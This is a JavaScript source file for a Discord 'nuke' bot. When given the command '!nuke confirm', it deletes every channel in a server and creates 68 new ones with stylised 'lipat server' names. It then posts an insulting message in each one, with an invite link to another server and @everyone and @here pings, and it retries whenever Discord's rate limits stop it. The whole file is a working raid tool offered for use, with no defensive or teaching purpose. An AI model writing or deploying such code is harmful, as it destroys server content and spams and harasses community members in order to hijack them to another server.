const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// Channel name pool (randomly picked each time)
const channelNames = [
  "𝔩𝔦𝔭𝔞𝔱 𝔰𝔢𝔯𝔳𝔢𝔯",
  "l̆̈ĭ̈p̆̈ă̈t̆̈ s̆̈ĕ̈r̆̈v̆̈ĕ̈r̆̈",
  "l̑̈ȋ̈p̑̈ȃ̈t̑̈ s̑̈v̑̈",
  "l҉i҉p҉a҉t҉ s҉e҉r҉v҉e҉r҉",
  "Lipat server"
];

const spamMsg = `# lipat server mga tanga! __https://discord.gg/fccuzDHAA__ ||@everyone|| ||@here||`;

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

// Delete ALL channels in the guild
async function deleteAllChannels(guild) {
  let channels = guild.channels.cache;
  console.log(`🗑️ Deleting ${channels.size} channels...`);
  for (let chan of channels.values()) {
    try {
      await chan.delete();
      console.log(`✅ Deleted ${chan.name}`);
      await sleep(300);
    } catch(e) {
      console.log(`❌ Failed to delete ${chan.name}: ${e.message}`);
    }
  }
}

// Create 68 channels, each with random name and immediate message
async function create68ChannelsAndSpam(guild) {
  let created = 0;
  for (let i = 1; i <= 68; i++) {
    // Pick random name from list
    let randomName = channelNames[Math.floor(Math.random() * channelNames.length)];
    // Add a number suffix to avoid duplicate name errors (Discord requires unique names)
    let channelName = `${randomName}-${i}`;
    
    try {
      let channel = await guild.channels.create({
        name: channelName,
        type: ChannelType.GuildText,
        permissionOverwrites: [{
          id: guild.roles.everyone.id,
          allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
        }]
      });
      console.log(`📝 Created #${channelName}`);
      
      // Send message IMMEDIATELY after creation
      try {
        await channel.send(spamMsg);
        console.log(`💬 Sent msg in #${channelName}`);
      } catch(err) {
        console.log(`❌ Msg failed in #${channelName}: ${err.message}`);
      }
      
      created++;
      await sleep(250); // Fast but avoids rate limits
    } catch(err) {
      if (err.code === 429) {
        console.log(`⏳ Rate limit, waiting ${err.retryAfter}s`);
        await sleep(err.retryAfter * 1000);
        i--; // retry this channel
      } else {
        console.log(`❌ Create fail: ${err.message}`);
      }
    }
  }
  console.log(`✅ Created ${created}/68 channels with messages`);
}

// Main nuke function
async function nukeGuild(guild) {
  console.log(`🔥 NUKING ${guild.name}`);
  await deleteAllChannels(guild);
  await create68ChannelsAndSpam(guild);
  console.log("💀 NUKE COMPLETE");
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  client.user.setPresence({
    status: 'dnd',
    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }]
  });
  console.log("✅ Status: DND | @azairo");
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot || !msg.content.startsWith('!')) return;
  const args = msg.content.slice(1).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  
  if (cmd === 'nuke') {
    if (args[0] !== 'confirm') {
      return msg.reply("⚠️ Type `!nuke confirm` to delete ALL channels, create 68 new ones with random names, and spam the message in each.");
    }
    await msg.reply("💣 NUKE STARTED. Deleting all channels and creating chaos...");
    await nukeGuild(msg.guild);
  }
});

client.login(TOKEN).catch(err => {
  console.error("❌ Login failed:", err.message);
});
